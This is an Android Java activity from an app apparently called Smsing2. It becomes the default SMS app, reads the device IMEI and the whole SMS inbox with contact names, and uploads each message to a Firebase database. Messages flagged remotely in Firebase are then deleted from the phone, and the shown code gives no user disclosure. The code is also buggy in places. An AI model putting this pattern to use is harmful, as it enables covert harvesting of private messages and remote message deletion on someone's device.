package com.rohit.smsing2;

import android.*;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.Query;
import com.google.firebase.database.ValueEventListener;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    ArrayList<SmsModel> arrayList = new ArrayList<SmsModel>();
    SmsAdapter adapter;
    private static final int READ_SMS_PERMISSIONS_REQUEST = 1;
    static MainActivity inst;
    String IMEI="";
    ListView listView;


    public static MainActivity getMainActivityInstance() {
        return inst;
    }
   static final FirebaseDatabase database = FirebaseDatabase.getInstance();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        if(!Telephony.Sms.getDefaultSmsPackage(getApplicationContext()).equals(getApplicationContext().getPackageName())) {
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,
                    getApplicationContext().getPackageName());
            startActivity(intent);
        }



        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        getPermissionToReadSMS();
        inst = this;

        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
  IMEI= telephonyManager.getDeviceId();
        Log.d("device_imei",IMEI);




        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    public void  getSmsFromAndroidDatabase(View view) {

        Uri uri = Uri.parse("content://sms/inbox");
        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(uri, null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        int indexTime = smsInboxCursor.getColumnIndex("date");
        int indexDate = smsInboxCursor.getColumnIndex("date");

        final FirebaseDatabase database = FirebaseDatabase.getInstance();
       DatabaseReference myRef = database.getReference("Smsing2/SmsDatabase");


        final DatabaseReference databaseReference = database.getReference("Smsing2/SmsDatabase/"+IMEI);
        getChangesFromFirebase();
        myRef.child(IMEI).removeValue();


        int i = 0;

        if (indexBody < 0 || !smsInboxCursor.moveToFirst()) ;
        arrayList.clear();
        do {
            String contact;

            contact = getContactName(getApplicationContext(),smsInboxCursor.getString(indexAddress));
            String time = smsInboxCursor.getString(indexTime);
            String date = smsInboxCursor.getString(indexDate);
            String number = smsInboxCursor.getString((indexAddress));
            String id = smsInboxCursor.getString(smsInboxCursor.getColumnIndex("_id"));
            Log.d("id",id);
            String body = smsInboxCursor.getString(indexBody);
            SmsModel sms = new SmsModel(id, contact, number, body, time, date,"0");

            String key = databaseReference.push().getKey();
            Map<String,Object>smsValues=sms.toMap();
            Map<String, Object> childUpdates = new HashMap<>();
            childUpdates.put(key,smsValues);
            databaseReference.updateChildren(childUpdates);
            arrayList.add(sms);
            //databaseReference databaseReference1=database.getReference("Smsing2/SmsDatabase/"+IMEI);
            //databaseReference.push().setValue(sms);

            i++;
            //String smsTime = convertDate(time, "hh:mm a");
            //String smsDate = convertDate(date, "dd MMM yyyy");


        } while (smsInboxCursor.moveToNext());

        Log.e("qwerty", "Total SMS in Inbox:" + i);
        //databaseReference.setValue(arrayList);

       listView=findViewById(R.id.listView);

        adapter = new SmsAdapter(this, R.layout.smsmodel,arrayList);
        listView.setAdapter(adapter);
        listView.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
            @Override
            public boolean onItemLongClick(AdapterView<?> adapterView, View view, int i, long l) {
                          removeItemFromList(i);
                return false;
            }


        });
        smsInboxCursor.close();
    }

    protected   void removeItemFromList(int position) {
        final int deletePosition = position;

        AlertDialog.Builder alert = new AlertDialog.Builder(
              getMainActivityInstance());

        alert.setTitle("Delete");
        alert.setMessage("Do you want delete this message?");
        alert.setPositiveButton("YES", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // TOD O Auto-generated method stub

                // main code on after clicking yes
                deleteSMS(getMainActivityInstance(),arrayList.get(deletePosition).getBody(),arrayList.get(deletePosition).getNumber(),"");
                arrayList.remove(deletePosition);
                adapter.notifyDataSetChanged();




            }
        });
        alert.setNegativeButton("CANCEL", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                // TODO Auto-generated method stub
                dialog.dismiss();
            }
        });

        alert.show();

    }

    public void deleteSMS(Context context, String message, String number, String timestamp) {
        try {
            Uri uriSms = Uri.parse("content://sms/inbox");
            Cursor c = context.getContentResolver().query(
                    uriSms,
                    new String[] { "_id", "thread_id", "address", "person",
                            "date", "body" },null, null, null);

            if (c != null && c.moveToFirst()) {
                do {
                    long id = c.getLong(0);
                    long threadId = c.getLong(1);
                    String address = c.getString(2);
                    String body = c.getString(5);
                    String date = c.getString(3);
                    //Log.d("msgbodytobe deleted",body);
                    if (message.equals(body) && address.equals(number)) {
                        Log.d("Deleting SMS with body:",body);
                        context.getContentResolver().delete(
                                Uri.parse("content://sms/" + id), "date=?",
                                new String[] { c.getString(4) });
                        Log.e("log>>>", "Delete success.........");
                    }
                } while (c.moveToNext());
            }
        } catch (Exception e) {
            Log.e("log>>>", e.toString());
        }
    }



    public void getChangesFromFirebase(){
        DatabaseReference databaseReference=database.getReference("Smsing2/SmsDatabase/"+IMEI);


        ChildEventListener childEventListener=new ChildEventListener() {
            @Override
            public void onChildAdded(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onChildChanged(DataSnapshot dataSnapshot, String s) {
                SmsModel smsModel=dataSnapshot.getValue(SmsModel.class);
                Log.d("deleteflag",smsModel.getDeleteFlag());
                if(smsModel.getDeleteFlag().equals("1")){
                    deleteSMS(getMainActivityInstance(),smsModel.getBody(),smsModel.getNumber(),"");
                    adapter.notifyDataSetChanged();
                }

            }

            @Override
            public void onChildRemoved(DataSnapshot dataSnapshot) {

            }

            @Override
            public void onChildMoved(DataSnapshot dataSnapshot, String s) {

            }

            @Override
            public void onCancelled(DatabaseError databaseError) {

            }
        };
        databaseReference.addChildEventListener(childEventListener);
    }





    public static String getContactName(Context context, String phoneNo) {
        ContentResolver cr = context.getContentResolver();
        Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNo));
        Cursor cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
        if (cursor == null) {
            return phoneNo;
        }
        String Name = phoneNo;
        if (cursor.moveToFirst()) {
            Name = cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME));
            Log.d("qwerty", "Contact Name: " + Name);
        }

        if (cursor != null && !cursor.isClosed()) {
            cursor.close();
        }

        return Name;

    }


    public void getPermissionToReadSMS() {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            if (shouldShowRequestPermissionRationale(
                    android.Manifest.permission.READ_SMS)) {
                Toast.makeText(this, "Please allow permission!", Toast.LENGTH_SHORT).show();
            }
            requestPermissions(new String[]{android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS,android.Manifest.permission.READ_PHONE_STATE}, READ_SMS_PERMISSIONS_REQUEST);
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String permissions[],
                                           @NonNull int[] grantResults) {
        // Make sure it's our original READ_CONTACTS request
        if (requestCode == READ_SMS_PERMISSIONS_REQUEST) {
            if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Toast.makeText(this, "Read SMS permission granted", Toast.LENGTH_SHORT).show();


                //refreshSmsInbox();
            } else {
                Toast.makeText(this, "Read SMS permission denied", Toast.LENGTH_SHORT).show();
            }

        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }



    public static class SmsAdapter extends ArrayAdapter<SmsModel> {
        int resource;
        ArrayList<SmsModel> response;
        Context context;

        public SmsAdapter(Context context, int resource, ArrayList<SmsModel> items) {
            super(context, resource, items);
            this.resource=resource;
            this.response=items;
            this.context=context;
        }






        @Override
        public View getView(int position, View convertView, ViewGroup parent){
            SmsModel smsModel = getItem(position);

            if (convertView == null) {
                convertView = LayoutInflater.from(getContext()).inflate(R.layout.smsmodel, parent, false);
            }
            TextView Name = convertView.findViewById(R.id.name);
            TextView Number = convertView.findViewById(R.id.number);
            TextView Body = convertView.findViewById(R.id.body);
            TextView Time=convertView.findViewById(R.id.time);


            Name.setText(smsModel.getName());
            Number.setText(smsModel.getNumber());
            Body.setText(smsModel.getBody());
            Time.setText("Time:"+smsModel.getTime()+ " \nDate:"+smsModel.getDate());


            return convertView;


        }

    }



}